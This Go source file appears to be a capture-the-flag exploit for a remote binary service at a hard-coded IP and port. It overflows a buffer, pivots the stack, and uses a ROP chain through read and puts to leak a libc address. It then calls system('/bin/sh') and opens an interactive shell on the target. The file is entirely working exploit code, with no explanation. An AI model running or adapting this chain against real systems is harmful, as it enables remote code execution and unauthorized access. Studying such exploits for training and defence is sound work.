package main

import(
  . "./gopwn"
  "time"
  "strings"
  "fmt"
)

func main(){
  conn, _ := Remote("140.110.112.223:2127")
  defer conn.Close()

  buf1 := 0x0804b000 - 0x200
  buf2 := 0x0804b000 - 0x400

  leave_ret := 0x08048418
  read_plt := 0x08048380
  puts_plt := 0x08048390
  puts_got := 0x8049ff0
  pop_ebx := 0x0804836d

  conn.Recvuntil('\n')
  conn.Send(strings.Repeat("a", 0x28) + P32(buf1) + P32(read_plt) + P32(leave_ret) + P32(0) + P32(buf1) + P32(0xffff))

  time.Sleep(1*time.Second)

  conn.Send(P32(buf2) + P32(puts_plt) + P32(pop_ebx) + P32(puts_got) + P32(read_plt) + P32(leave_ret) + P32(0) + P32(buf2) + P32(0xffff))

  puts_libc, _ := conn.Recvuntil('\n')
  libc := U32(strings.TrimRight(puts_libc, "\n")) - 0x0005fca0
  fmt.Printf("%x\n", libc)

  system_libc := libc + 0x0003ada0

  conn.Send(P32(buf1) + P32(system_libc) + P32(leave_ret) + P32(buf2+0x10) + "/bin/sh\x00")

  conn.Interactive()
}